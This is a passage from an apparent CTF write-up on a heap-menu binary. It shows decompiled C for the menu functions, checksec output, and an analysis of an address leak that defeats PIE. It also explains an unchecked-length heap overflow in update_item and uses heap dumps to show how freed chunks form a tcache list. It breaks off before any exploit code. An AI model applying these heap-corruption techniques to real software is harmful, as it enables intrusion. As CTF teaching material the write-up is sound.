</span></span><span style="display:flex;"><span>    fwrite(<span style="color:#c30">&#34;Database is empty</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0x12</span>,stderr);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>    fwrite(<span style="color:#c30">&#34;Please enter the index of element =&gt; &#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0x25</span>,stderr);
</span></span><span style="display:flex;"><span>    read(<span style="color:#f60">0</span>,local_18,<span style="color:#f60">8</span>);
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#555">=</span> atoi(local_18);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">0x10</span> <span style="color:#555">+</span> <span style="color:#f60">8</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>      fwrite(<span style="color:#c30">&#34;Invalid index</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0xe</span>,stderr);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>      free(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">0x10</span> <span style="color:#555">+</span> <span style="color:#f60">8</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">0x10</span> <span style="color:#555">+</span> <span style="color:#f60">8</span>) <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">0x10</span>) <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>      fwrite(<span style="color:#c30">&#34;Element deleted successfully!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0x1e</span>,stderr);
</span></span><span style="display:flex;"><span>      len <span style="color:#555">=</span> len <span style="color:#555">+</span> <span style="color:#555">-</span><span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    __stack_chk_fail();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>update_item</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">update_item</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> iVar1;
</span></span><span style="display:flex;"><span>  uint uVar2;
</span></span><span style="display:flex;"><span>  ssize_t sVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_30 [<span style="color:#f60">8</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_28 [<span style="color:#f60">24</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (len <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>    fwrite(<span style="color:#c30">&#34;Database is empty!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0x13</span>,stderr);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>    fwrite(<span style="color:#c30">&#34;Please enter the index of element =&gt; &#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0x25</span>,stderr);
</span></span><span style="display:flex;"><span>    read(<span style="color:#f60">0</span>,local_30,<span style="color:#f60">8</span>);
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#555">=</span> atoi(local_30);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">0x10</span> <span style="color:#555">+</span> <span style="color:#f60">8</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>      fwrite(<span style="color:#c30">&#34;Invalid index</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0xe</span>,stderr);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>      fwrite(<span style="color:#c30">&#34;Please enter the length of string =&gt; &#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0x25</span>,stderr);
</span></span><span style="display:flex;"><span>      read(<span style="color:#f60">0</span>,local_28,<span style="color:#f60">8</span>);
</span></span><span style="display:flex;"><span>      uVar2 <span style="color:#555">=</span> atoi(local_28);
</span></span><span style="display:flex;"><span>      <span style="color:#555">*</span>(ulong <span style="color:#555">*</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">0x10</span>) <span style="color:#555">=</span> (ulong)uVar2;
</span></span><span style="display:flex;"><span>      fwrite(<span style="color:#c30">&#34;Please enter the string =&gt; &#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0x1b</span>,stderr);
</span></span><span style="display:flex;"><span>      sVar3 <span style="color:#555">=</span> read(<span style="color:#f60">0</span>,<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">0x10</span> <span style="color:#555">+</span> <span style="color:#f60">8</span>),(ulong)uVar2);
</span></span><span style="display:flex;"><span>      <span style="color:#555">*</span>(undefined <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)(<span style="color:#078;font-weight:bold">int</span>)sVar3 <span style="color:#555">+</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">0x10</span> <span style="color:#555">+</span> <span style="color:#f60">8</span>)) <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    __stack_chk_fail();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>leave</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">leave</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Thanks a lot!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">Goodbye!&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is also secret function which will print the flag</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">secret</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  system(<span style="color:#c30">&#34;/bin/cat ./flag&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s checksec the binary:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>RELRO:    No RELRO
</span></span><span style="display:flex;"><span>Stack:    Canary found
</span></span><span style="display:flex;"><span>NX:       NX enabled
</span></span><span style="display:flex;"><span>PIE:      PIE enabled
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, PIE is enabled</p>
<h4 id="analysis">Analysis <a href="#analysis" class="anchor">#</a></h4>
<h5 id="main">main <a href="#main" class="anchor">#</a></h5>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// At main function
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>fprintf(stderr,<span style="color:#c30">&#34;This might help: %p</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,main);
</span></span></code></pre></td></tr></table>
</div>
</div><p>Reading through the code, I notice that the binary leak us the main address, which mean the PIE mitigation isn&rsquo;t matter at all. We can calculate the address of available functions, plt, got, etc.</p>
<h5 id="insert_item">insert_item <a href="#insert_item" class="anchor">#</a></h5>
<p>Observation on the <code>insert_item</code> method, we can control the malloc chunk size.</p>
<h5 id="delete_item">delete_item <a href="#delete_item" class="anchor">#</a></h5>
<p>Observation on the <code>delete_item</code> method, the pointer was nulled after free, so we couldn&rsquo;t do UAF or Double Free.</p>
<h5 id="update_item">update_item <a href="#update_item" class="anchor">#</a></h5>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>fwrite(<span style="color:#c30">&#34;Please enter the length of string =&gt; &#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0x25</span>,stderr);
</span></span><span style="display:flex;"><span>read(<span style="color:#f60">0</span>,local_28,<span style="color:#f60">8</span>);
</span></span><span style="display:flex;"><span>uVar2 <span style="color:#555">=</span> atoi(local_28);
</span></span><span style="display:flex;"><span><span style="color:#555">*</span>(ulong <span style="color:#555">*</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">0x10</span>) <span style="color:#555">=</span> (ulong)uVar2;
</span></span><span style="display:flex;"><span>fwrite(<span style="color:#c30">&#34;Please enter the string =&gt; &#34;</span>,<span style="color:#f60">1</span>,<span style="color:#f60">0x1b</span>,stderr);
</span></span><span style="display:flex;"><span>sVar3 <span style="color:#555">=</span> read(<span style="color:#f60">0</span>,<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">0x10</span> <span style="color:#555">+</span> <span style="color:#f60">8</span>),(ulong)uVar2);
</span></span><span style="display:flex;"><span><span style="color:#555">*</span>(undefined <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)(<span style="color:#078;font-weight:bold">int</span>)sVar3 <span style="color:#555">+</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(data_base <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">0x10</span> <span style="color:#555">+</span> <span style="color:#f60">8</span>)) <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Observation on the <code>update_item</code> method, we can see that there is heap-overflow. Notice that there isn&rsquo;t any check on the item&rsquo;s size during update. If we put larger size during update than the allocated chunk size, we can overwrite the other chunks value.</p>
<p>For example, let say that we <code>insert_item</code> three times with size <code>0x10</code>. The chunk will be like below.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>0x555555602290	0x0000000000000000	0x0000000000000021	........!.......
</span></span><span style="display:flex;"><span>0x5555556022a0	0x6161616161616161	0x0a61616161616161	aaaaaaaaaaaaaaa.
</span></span><span style="display:flex;"><span>0x5555556022b0	0x0000000000000000	0x0000000000000021	........!.......
</span></span><span style="display:flex;"><span>0x5555556022c0	0x6262626262626262	0x0a62626262626262	bbbbbbbbbbbbbbb.
</span></span><span style="display:flex;"><span>0x5555556022d0	0x0000000000000000	0x0000000000000021	........!.......
</span></span><span style="display:flex;"><span>0x5555556022e0	0x6363636363636363	0x0a63636363636363	ccccccccccccccc.
</span></span></code></pre></td></tr></table>
</div>
</div><p>What if we set bigger size during <code>update_item</code>? Then we can overwrite the other chunks which located next to each other.</p>
<p>What happen if we free the chunks? It will be put to <code>tcache</code> bins, and then it will maintained a linked-list of the cache. Let say that we free the second and third chunk, the heap will be like below.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>0x555555602290	0x0000000000000000	0x0000000000000021	........!.......
</span></span><span style="display:flex;"><span>0x5555556022a0	0x6161616161616161	0x0a61616161616161	aaaaaaaaaaaaaaa.
</span></span><span style="display:flex;"><span>0x5555556022b0	0x0000000000000000	0x0000000000000021	........!.......
</span></span><span style="display:flex;"><span>0x5555556022c0	0x00005555556022e0	0x0000555555602010	.<span style="color:#c30">&#34;`UUU... `UUU..	 &lt;-- tcachebins[0x20][0/2]
</span></span></span><span style="display:flex;"><span><span style="color:#c30">0x5555556022d0	0x0000000000000000	0x0000000000000021	........!.......
</span></span></span><span style="display:flex;"><span><span style="color:#c30">0x5555556022e0	0x0000000000000000	0x0000555555602010	......... `UUU..	 &lt;-- tcachebins[0x20][1/2]
</span></span></span><span style="display:flex;"><span><span style="color:#c30">...
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>To give a better visualization, below is the current state of the tcache linked_list</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
